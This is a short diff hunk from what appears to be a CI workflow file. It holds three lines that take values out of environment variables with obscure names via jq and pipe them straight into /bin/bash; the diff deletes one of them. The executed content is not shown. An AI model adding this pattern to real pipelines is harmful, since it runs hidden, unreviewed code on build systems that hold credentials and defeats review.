@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$brr4192" | jq -r .uv5 | /bin/bash
           printf '%s' "$ss334" | jq -r .argw4675 | /bin/bash
-          printf '%s' "$t84" | jq -r .ljg1347 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
